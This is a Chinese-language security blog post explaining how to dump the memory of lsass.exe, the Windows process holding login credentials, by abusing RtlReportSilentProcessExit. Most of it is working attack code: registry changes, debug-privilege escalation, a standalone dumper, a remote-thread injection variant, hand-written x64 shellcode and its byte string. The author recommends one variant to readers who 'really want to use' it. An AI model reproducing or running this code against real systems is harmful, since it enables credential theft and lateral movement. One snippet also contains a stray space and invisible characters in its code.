RtlReportSilentProcessExit dump Lsass.exe
=========================================

最近学习了一下dump Lsass.exe的方法，看到了一种没见过的

调用RtlReportSilentProcessExit静默退出dump内存

0x01 原理
-------

1. 修改注册表，配置dump保存路径这些
2. 通过RtlReportSilentProcessExit告诉系统正在执行静默退出，但是实际上不会退出

先看一下注册表需要配置什么

```php
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\
```

需要在上面的注册表内新建项，这个项的名字需要和进程同名，需要dump lsass.exe就需要创建

```php
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lsass.exe
-GlobalFlag         0x200           启用静默进程退出监测
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe
-DumpType           0x02        dump内存的类型
-LocalDumpFolder    c:\temp     这是dump后保存的地址
-ReportingMode      0x02        退出执行的操作
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-ad3aa4d34d114beaa3126a34778ebf51b2d64beb.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-ad3aa4d34d114beaa3126a34778ebf51b2d64beb.png)  
还有启动的值

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-5810132fcbe505cce23caf4b8c466c1d6a8fee78.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-5810132fcbe505cce23caf4b8c466c1d6a8fee78.png)  
msdn的地址贴在最后

下面就可以开始写代码了

RtlReportSilentProcessExit可以外部调用也可以通过线程注入到进程内存中，这次着重写线程注入的方法

0x02 外部调用
---------

```C++
#include "windows.h"
#include "tlhelp32.h"
#include "stdio.h"
#include "shlwapi.h"

#pragma comment(lib, "shlwapi.lib")

#define IFEO_REG_KEY L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"
#define SILENT_PROCESS_EXIT_REG_KEY L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\"
#define LOCAL_DUMP 0x2
#define FLG_MONITOR_SILENT_PROCESS_EXIT 0x200
#define DUMP_FOLDER L"C:\\temp"
#define MiniDumpWithFullMemory 0x2

typedef NTSTATUS(NTAPI* fRtlReportSilentProcessExit)(
    HANDLE processHandle,
    NTSTATUS ExitStatus
    );

BOOL EnableDebugPriv() {
    HANDLE hToken = NULL;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        printf(" - 获取当前进程Token失败 %#X\n", GetLastError());
        return FALSE;
    }
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        printf(" - Lookup SE_DEBUG_NAME失败 %#X\n", GetLastError());
        return FALSE;
    }
    TOKEN_PRIVILEGES tokenPriv;
    tokenPriv.PrivilegeCount = 1;
    tokenPriv.Privileges[0].Luid = luid;
    tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, sizeof(tokenPriv), NULL, NULL)) {
        printf(" - AdjustTokenPrivileges 失败: %#X\n", GetLastError());
        return FALSE;
    }
    return TRUE;
}

BOOL setRelatedRegs(PCWCHAR procName) {

    HKEY hkResSubIFEO = NULL;
    HKEY hkResSubSPE = NULL;
    DWORD globalFlag = FLG_MONITOR_SILENT_PROCESS_EXIT;
    DWORD reportingMode = MiniDumpWithFullMemory;
    DWORD dumpType = LOCAL_DUMP, retstatus = -1;

    BOOL ret = FALSE;

    PWCHAR subkeyIFEO = (PWCHAR)malloc(lstrlenW(IFEO_REG_KEY) * 2 + lstrlenW(procName) * 2 + 5);
    wsprintf(subkeyIFEO, L"%ws%ws", IFEO_REG_KEY, procName);
    PWCHAR subkeySPE = (PWCHAR)malloc(lstrlenW(SILENT_PROCESS_EXIT_REG_KEY) * 2 + lstrlenW(procName) * 2 + 5);
    wsprintf(subkeySPE, L"%ws%ws", SILENT_PROCESS_EXIT_REG_KEY, procName);

    printf(" - [DEBUGPRINT] Image_File_Execution_Options: %ws\n", subkeyIFEO);
    printf(" - [DEBUGPRINT] SilentProcessExit: %ws\n", subkeySPE);

    do {
        // 设置 Image File Execution Options\<ProcessName> 下GlobalFlag键值为0x200
        if (ERROR_SUCCESS != (retstatus = RegCreateKey(HKEY_LOCAL_MACHINE, subkeyIFEO, &hkResSubIFEO))) {
            printf(" - 打开注册表项 Image_File_Execution_Options 失败: %#X\n", GetLastError());
            break;
        }
        if (ERROR_SUCCESS != (retstatus = RegSetValueEx(hkResSubIFEO, L"GlobalFlag", 0, REG_DWORD, (const BYTE*)&globalFlag, sizeof(globalFlag)))) {
            printf(" - 设置注册表键 GlobalFlag 键值失败: %#X\n", GetLastError());
            break;
        }

        // 设置 SilentProcessExit\<ProcessName> 下 ReporingMode/LocalDumpFolder/DumpType 三个值
        if (ERROR_SUCCESS != (retstatus = RegCreateKey(HKEY_LOCAL_MACHINE, subkeySPE, &hkResSubSPE))) {
            printf(" - 打开注册表项 SilentProcessExit 失败: %#X\n", GetLastError());
            break;
        }
        if (ERROR_SUCCESS != (retstatus = RegSetValueEx(hkResSubSPE, L"ReportingMode", 0, REG_DWORD, (const BYTE*)&reportingMode, sizeof(reportingMode)))
            || ERROR_SUCCESS != (retstatus = RegSetValueEx(hkResSubSPE, L"LocalDumpFolder", 0, REG_SZ, (const BYTE*)DUMP_FOLDER, lstrlenW(DUMP_FOLDER) * 2))
            || ERROR_SUCCESS != (retstatus = RegSetValueEx(hkResSubSPE, L"DumpType", 0, REG_DWORD, (const BYTE*)&dumpType, sizeof(dumpType)))) {
            printf(" - 设置注册表键 reportingMode|LocalDumpFolder|DumpType 键值失败: %#X\n", GetLastError());
            break;
        }
        printf(" - 注册表设置完成 ...\n");
        ret = TRUE;

    } while (FALSE);

    free(subkeyIFEO);
    free(subkeySPE);
    if (hkResSubIFEO)
        CloseHandle(hkResSubIFEO);
    if (hkResSubSPE)
        CloseHandle(hkResSubSPE);

    return ret;
}

DWORD getPidByName(PCWCHAR procName) {

    HANDLE hProcSnapshot;
    DWORD retPid = -1;
    hProcSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe;

    if (INVALID_HANDLE_VALUE == hProcSnapshot) {
        printf(" - 创建快照失败!\n");
        return -1;
    }
    pe.dwSize = sizeof(PROCESSENTRY32W);
    if (!Process32First(hProcSnapshot, &pe)) {
        printf(" - Process32First Error : %#X\n", GetLastError());
        return -1;
    }
    do {
        if (!lstrcmpiW(procName, PathFindFileName(pe.szExeFile))) {
            retPid = pe.th32ProcessID;
        }
    } while (Process32Next(hProcSnapshot, &pe));
    CloseHandle(hProcSnapshot);
    return retPid;
}

INT main() {

    PCWCHAR targetProcName = L"lsass.exe";
    DWORD pid = -1;
    HMODULE hNtMod = NULL;
    fRtlReportSilentProcessExit fnRtlReportSilentProcessExit = NULL;
    HANDLE hLsassProc = NULL;
    NTSTATUS ntStatus = -1;

    if (!EnableDebugPriv()) {
        printf(" - 启用当前进程DEBUG权限失败: %#X\n", GetLastError());
        return 1;
    }
    printf(" - 启用当前进程DEBUG权限 OK\n");

    if (!setRelatedRegs(targetProcName)) {
        printf(" - 设置相关注册表键值失败: %#X\n", GetLastError());
        return 1;
    }
    printf(" - 设置相关注册表键值 OK\n");

    pid = getPidByName(targetProcName);
    if (-1 == pid) {
        printf(" - 获取目标进程pid: %#X\n", pid);
        return 1;
    }
    printf(" - 获取目标PID: %#X\n", pid);

    do
    {
        hNtMod = GetModuleHandle(L"ntdll.dll");
        if (!hNtMod) {
            printf(" - 获取NTDLL模块句柄失败\n");
            break;
        }
        printf(" - NTDLL模块句柄: %#X\n", (DWORD)hNtMod);
        fnRtlReportSilentProcessExit = (fRtlReportSilentProcessExit)GetProcAddress(hNtMod, "RtlReportSilentProcessExit");
        if (!fnRtlReportSilentProcessExit) {
            printf(" - 获取API RtlReportSilentProcessExit地址失败\n");
            break;
        }
        printf(" - RtlReportSilentProcessExit地址: %#X\n", (DWORD)fnRtlReportSilentProcessExit);
        hLsassProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, 0, pid);
        if (!hLsassProc) {
            printf(" - 获取lsass进程句柄失败: %#X\n", GetLastError());
            break;
        }
        printf(" - 获取lsass进程句柄: %#X\n", (DWORD)hLsassProc);

        ntStatus = fnRtlReportSilentProcessExit(hLsassProc, 0);
        printf(" - 结束,查看c:\\temp\\lsass*.dmp...RET CODE : %#X\n", (DWORD)ntStatus);

    } while (false);

    if (hNtMod)
        CloseHandle(hNtMod);
    if (fnRtlReportSilentProcessExit)
        CloseHandle(fnRtlReportSilentProcessExit);
    if (hLsassProc)
        CloseHandle(hLsassProc);
    if (fnRtlReportSilentProcessExit)
        fnRtlReportSilentProcessExit = NULL;

    return 0;
}
```

修改注册表-&gt;开启DEBUG权限-&gt;遍历LSASS.EXE pid-&gt;得到RtlReportSilentProcessExit函数指针-&gt;执行RtlReportSilentProcessExit静默退出

最后会在指定的目录下生成一个文件夹，存放dump的内存

但是用这个方法会出现

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-aba05da63cc44c6e4cc9f044c4381112a256119c.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-aba05da63cc44c6e4cc9f044c4381112a256119c.png)  
把执行的进程也dump出来，问题是不大就是有点不美观

所以想尝试线程注入的方式

0x03 线程注入
---------

### ThreadProc

之前写线程注入的时候写过，CreateRemoteThread第四个参数是函数，第五个参数是函数的参数

注意使用CreateThread创建线程的时候可以直接使用函数

使用CreateRemoteThread需要传入函数指针调用函数

```c++
#include<stdio.h>
#include<Windows.h>
#include<tlhelp32.h>
#include "shlwapi.h"

#pragma comment(lib, "shlwapi.lib")

typedef NTSTATUS(NTAPI* fRtlReportSilentProcessExit)(
    HANDLE processHandle,
    NTSTATUS ExitStatus
);

typedef struct Rtl {
    HANDLE GCP;                                 //参数
    FARPROC dwRtlReportSilentProcessExit;       //函数地址
} RtlReportParam;

DWORD WINAPI threadProc(LPVOID lParam)//线程函数
{
    fRtlReportSilentProcessExit RtlReportSilentProcessExit;     //声明函数
    RtlReportPar    am* pRP = (RtlReportParam*)lParam;              //将指针转换为结构指针
    RtlReportSilentProcessExit = (fRtlReportSilentProcessExit)pRP->dwRtlReportSilentProcessExit;    //取出函数指针
    RtlReportSilentProcessExit(pRP->GCP, 0);        //调用函数

    return 0;
}

DWORD getPidByName(PCWCHAR procName) {              //获取进程PID

    HANDLE hProcSnapshot;
    DWORD retPid = -1;
    hProcSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe;

    if (INVALID_HANDLE_VALUE == hProcSnapshot) {
        printf(" - 创建快照失败!\n");
        return -1;
    }
    pe.dwSize = sizeof(PROCESSENTRY32W);
    if (!Process32First(hProcSnapshot, &pe)) {
        printf(" - Process32First Error : %#X\n", GetLastError());
        return -1;
    }
    do {
        if (!lstrcmpiW(procName, PathFindFileName(pe.szExeFile))) {
            retPid = pe.th32ProcessID;
        }
    } while (Process32Next(hProcSnapshot, &pe));
    CloseHandle(hProcSnapshot);
    return retPid;
}

void main()
{
    DWORD dwSize = 4096;
    PCWCHAR targetProcName = L"lsass.exe";
    int pid = getPidByName(targetProcName);
    HANDLE notepad = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);

    //把ThreadProcx写入内存
    LPVOID base_address = VirtualAllocEx(notepad, 0, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    printf("function_address: %p\n", base_address);
    BOOL res = WriteProcessMemory(notepad, base_address, &threadProc, dwSize, 0);

​    
   //获取函数地址和参数，传到结构里面并写入注入进程的内存
​    RtlReportParam RtlReportParamData;
​    ZeroMemory(&RtlReportParamData, sizeof(RtlReportParam));
​    RtlReportParamData.dwRtlReportSilentProcessExit = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlReportSilentProcessExit");             
​    RtlReportParamData.GCP = GetCurrentProcess();

    LPVOID pRemoteParam = VirtualAllocEx(notepad, 0, sizeof(RtlReportParamData), MEM_COMMIT, PAGE_READWRITE);
    printf("Param: %p", RtlReportParamData.dwRtlReportSilentProcessExit);

    WriteProcessMemory(notepad, pRemoteParam, &RtlReportParamData, sizeof(RtlReportParamData), 0);
    DWORD dwWriteBytes;

    //执行函数
    HANDLE hRemoteThread = CreateRemoteThread(
        notepad, NULL, 0, (DWORD(WINAPI*)(void*))base_address,
        pRemoteParam, CREATE_SUSPENDED, &dwWriteBytes);
    ResumeThread(hRemoteThread);
}
```

这里没写注册表，就是个测试文件，但是很不稳定所以就想写个shellcode这样函数的调用会很清楚

### 编写64位shellcode

以前写过32位的shellcode，其实差不多，需要注意的是64位的指针是八个字节的

### VisualStudio x64汇编

VistualStudio x64不支持\_\_asm，需要配置一下才能执行汇编

右键项目-&gt;生成依赖项-&gt;生成自定义

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-0d51549932d7f69096c0a2849f192dd6d0818a00.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-0d51549932d7f69096c0a2849f192dd6d0818a00.png)

勾选masm，新建一个asm文件，就可以开始写汇编了

写完之后需要在cpp文件里面声明函数，函数名要和汇编内一样

```C++
#include<stdio.h>
extern "C" void func();
int main() {
    func();
    return 0;
}
```

现在就可以开始编写shellcode了

### 64位shellcode

在64位中指针有8个字节，所以有些偏移需要改一下

下面是汇编文件

```asm
.DATA       ;数据段
.CODE       ;代码段
func PROC   ;定义函数，函数名和cpp文件内声明函数一样
mov rdx,gs:[60h]            ;64位PEB地址
mov rbx, [rdx+18h]          ;Ldr
mov rsi, [rbx+28h]          ;InMemoryOrderModuleList
mov rsi,[rsi]               
mov rsi,[rsi]
mov rsi,[rsi]               ;找到ntdll.dll的LDR_DATA_TABLE_ENTRY
mov rbx, [rsi+20h]          ;ntdll.dll的基址
mov edx, [rbx+3Ch]          ;e_lfanew偏移
add rdx, rbx                ;e_lfanew
mov edx, [rdx+88h]          ;VirtualAddress偏移
add rdx, rbx                ;VirtualAddress
mov esi, [rdx+20h]          ;AddressOfNames偏移
add rsi, rbx                ;AddressOfNames
xor rcx,rcx                 ;rcx置零

Get_Function:
inc rcx
lodsd
add rax,rbx
cmp dword ptr [rax], 526c7452h
jnz Get_Function
cmp dword ptr [rax+4], 726f7065h
jnz Get_Function
cmp dword ptr [rax+8], 6c695374h
jnz Get_Function                
;找到RtlReportSilentProcessExit名称地址

mov esi, [rdx+24h]
add rsi, rbx
mov cx, [rsi + rcx * 2]
dec rcx
mov esi, [rdx+1ch]
add rsi, rbx
mov edx, [rsi + rcx * 4]
add rdx, rbx
mov rbx, rdx

;这里都和32位差不多

mov rcx, -1         ;-1代表当前进程句柄，因为需要注入到进程在那个进程就是当前进程
mov rdx, 0          ;第二个参数
call rbx            ;执行RtlReportSilentProcessExit
ret 
func ENDP;
END
```

用脚本提取一下shellcode在32位文章里面有写过

把原来的代码修改一下

```c++
#include <Windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include "shlwapi.h"

#pragma comment(lib, "shlwapi.lib")

#define IFEO_REG_KEY L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\lsass.exe"
#define SILENT_PROCESS_EXIT_REG_KEY L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe"
#define LOCAL_DUMP 0x2
#define FLG_MONITOR_SILENT_PROCESS_EXIT 0x200
#define DUMP_FOLDER L"c:\\windows\\temp"
#define MiniDumpWithFullMemory 0x2

BOOL EnableDebugPriv() {
    HANDLE hToken = NULL;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        printf(" - 获取当前进程Token失败 %#X\n", GetLastError());
        return FALSE;
    }
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        printf(" - Lookup SE_DEBUG_NAME失败 %#X\n", GetLastError());
        return FALSE;
    }
    TOKEN_PRIVILEGES tokenPriv;
    tokenPriv.PrivilegeCount = 1;
    tokenPriv.Privileges[0].Luid = luid;
    tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, sizeof(tokenPriv), NULL, NULL)) {
        printf(" - AdjustTokenPrivileges 失败: %#X\n", GetLastError());
        return FALSE;
    }
    return TRUE;
}

BOOL setRelatedRegs(PCWCHAR procName) {

    HKEY hkResSubIFEO = NULL;
    HKEY hkResSubSPE = NULL;
    DWORD globalFlag = FLG_MONITOR_SILENT_PROCESS_EXIT;
    DWORD reportingMode = MiniDumpWithFullMemory;
    DWORD dumpType = LOCAL_DUMP, retstatus = -1;

    BOOL ret = FALSE;

    if (ERROR_SUCCESS != (retstatus = RegCreateKey(HKEY_LOCAL_MACHINE, IFEO_REG_KEY, &hkResSubIFEO))) {
        printf(" - 打开注册表项 Image_File_Execution_Options 失败: %#X\n", GetLastError());
        return -1;
    }
    if (ERROR_SUCCESS != (retstatus = RegSetValueEx(hkResSubIFEO, L"GlobalFlag", 0, REG_DWORD, (const BYTE*)&globalFlag, sizeof(globalFlag)))) {
        printf(" - 设置注册表键 GlobalFlag 键值失败: %#X\n", GetLastError());
        return -1;
    }

    if (ERROR_SUCCESS != (retstatus = RegCreateKey(HKEY_LOCAL_MACHINE, SILENT_PROCESS_EXIT_REG_KEY, &hkResSubSPE))) {
        printf(" - 打开注册表项 SilentProcessExit 失败: %#X\n", GetLastError());
        return -1;
    }
    if (ERROR_SUCCESS != (retstatus = RegSetValueEx(hkResSubSPE, L"ReportingMode", 0, REG_DWORD, (const BYTE*)&reportingMode, sizeof(reportingMode)))
        || ERROR_SUCCESS != (retstatus = RegSetValueEx(hkResSubSPE, L"LocalDumpFolder", 0, REG_SZ, (const BYTE*)DUMP_FOLDER, lstrlenW(DUMP_FOLDER) * 2))
        || ERROR_SUCCESS != (retstatus = RegSetValueEx(hkResSubSPE, L"DumpType", 0, REG_DWORD, (const BYTE*)&dumpType, sizeof(dumpType)))) {
        printf(" - 设置注册表键 reportingMode|LocalDumpFolder|DumpType 键值失败: %#X\n", GetLastError());
        return -1;
    }
    printf("[+]注册表设置完成 ...\n");
    ret = TRUE;
    if (hkResSubIFEO)
        CloseHandle(hkResSubIFEO);
    if (hkResSubSPE)
        CloseHandle(hkResSubSPE);

    return ret;
}

DWORD getPidByName(PCWCHAR procName) {

    HANDLE hProcSnapshot;
    DWORD retPid = -1;
    hProcSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe;

    if (INVALID_HANDLE_VALUE == hProcSnapshot) {
        printf(" - 创建快照失败!\n");
        return -1;
    }
    pe.dwSize = sizeof(PROCESSENTRY32W);
    if (!Process32First(hProcSnapshot, &pe)) {
        printf(" - Process32First Error : %#X\n", GetLastError());
        return -1;
    }
    do {
        if (!lstrcmpiW(procName, PathFindFileName(pe.szExeFile))) {
            retPid = pe.th32ProcessID;
        }
    } while (Process32Next(hProcSnapshot, &pe));
    CloseHandle(hProcSnapshot);
    return retPid;
}

typedef NTSTATUS(NTAPI* fRtlReportSilentProcessExit)(
    HANDLE processHandle,
    NTSTATUS ExitStatus
    );

typedef struct _RtlReportSilentProcessExitParam {
    HANDLE GCP;
    FARPROC dwRtlReportSilentProcessExit;
} RtlReportSilentProcessExitParam;

DWORD WINAPI  ThreadProc(LPVOID lpParameter) {

    fRtlReportSilentProcessExit RtlReportSilentProcessExit;
    RtlReportSilentProcessExitParam* pRP = (RtlReportSilentProcessExitParam*)lpParameter;
    RtlReportSilentProcessExit = (fRtlReportSilentProcessExit)pRP->dwRtlReportSilentProcessExit;
    RtlReportSilentProcessExit(pRP->GCP, 0);

    return 0;
}

INT main() {
    NTSTATUS ntStatus = -1;
    HMODULE hNtMod = NULL;
    PCWCHAR targetProcName = L"lsass.exe";
    DWORD pid = -1;
    HANDLE hLsassProc = NULL;
    DWORD dwSize = 4096;

    char sc[] = "\x65\x48\x8B\x14\x25\x60\x00\x00\x00\x48\x8B\x5A\x18\x48\x8B\x73\x28\x48\x8B\x36\x48\x8B\x36\x48\x8B\x36\x48\x8B\x5E\x20\x8B\x53\x3C\x48\x03\xD3\x8B\x92\x88\x00\x00\x00\x48\x03\xD3\x8B\x72\x20\x48\x03\xF3\x48\x33\xC9\x48\xFF\xC1\xAD\x48\x03\xC3\x81\x38\x52\x74\x6C\x52\x75\xF1\x81\x78\x04\x65\x70\x6F\x72\x75\xE8\x81\x78\x08\x74\x53\x69\x6C\x75\xDF\x8B\x72\x24\x48\x03\xF3\x66\x8B\x0C\x4E\x48\xFF\xC9\x8B\x72\x1C\x48\x03\xF3\x8B\x14\x8E\x48\x03\xD3\x48\x8B\xDA\x48\xC7\xC1\xFF\xFF\xFF\xFF\x48\xC7\xC2\x00\x00\x00\x00\xFF\xD3\xC3";
    if (!EnableDebugPriv()) {
        printf(" - 启用当前进程DEBUG权限失败: %#X\n", GetLastError());
        return 1;
    }
    printf("[+]启用当前进程DEBUG权限 OK\n");

    if (!setRelatedRegs(targetProcName)) {
        printf(" - 设置相关注册表键值失败: %#X\n", GetLastError());
        return 1;
    }
    printf("[+]设置相关注册表键值 OK\n");

    pid = getPidByName(targetProcName);
    if (-1 == pid) {
        printf(" - 获取目标进程pid: %#X\n", pid);
        return 1;
    }
    printf("[+]获取目标PID: %#X\n", pid);

    hLsassProc = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
    if (!hLsassProc) {
        printf(" - 获取lsass进程句柄失败: %#X\n", GetLastError());
        return -1;
    }
    printf("[+]获取lsass进程句柄: %#X\n", (DWORD)hLsassProc);

    LPVOID base_address = VirtualAllocEx(hLsassProc, 0, sizeof(sc), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (base_address == 0) {
        printf("[-]获取地址失败 ERRORCODE: %d", GetLastError());
        return -1;
    }
    printf("[+]获取地址成功: %p\n", base_address);
    BOOL res = WriteProcessMemory(hLsassProc, base_address, &sc, sizeof(sc), 0);
    if (!res) {
        printf("[-]写入函数失败\n");
        return -1;
    }
    printf("[+]写入函数成功\n[+]function_address: %p\n", base_address);

    DWORD ID;
    HANDLE ThreadHandle = CreateRemoteThread(hLsassProc, NULL, 0, (LPTHREAD_START_ROUTINE)base_address, 0, CREATE_SUSPENDED, &ID);
    if (ThreadHandle) {
        printf("[+]ThreadInject Success\n");
        ResumeThread(ThreadHandle);

    }
    printf("[+]dump文件在c:\\windows\\temp\\lsass-*\\");
    return 0;
}
```

这样就可以用了，线程注入需要写入注册表后重启电脑才可以使用，虽然dump出的内存文件只有LSASS.EXE，很明显没有外部调用稳定

还有杀软强一点可能就不能注入了

这篇文章主要还是记一下过程，各位师傅真的要用还是用外部调用吧

0x04 资料
-------

[https://mp.weixin.qq.com/s?\_\_biz=MzA5ODA0NDE2MA==&amp;mid=2649751822&amp;idx=3&amp;sn=d8a0d685152418e7b8a6abf532365aa2&amp;chksm=88933161bfe4b87759a0483aeb25c6bc82d098b7d98209b6cd482b3c5bd845aec349df30ae57#rd](https://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649751822&idx=3&sn=d8a0d685152418e7b8a6abf532365aa2&chksm=88933161bfe4b87759a0483aeb25c6bc82d098b7d98209b6cd482b3c5bd845aec349df30ae57#rd)

<https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/registry-entries-for-silent-process-exit>

<https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/enable-silent-process-exit-monitoring>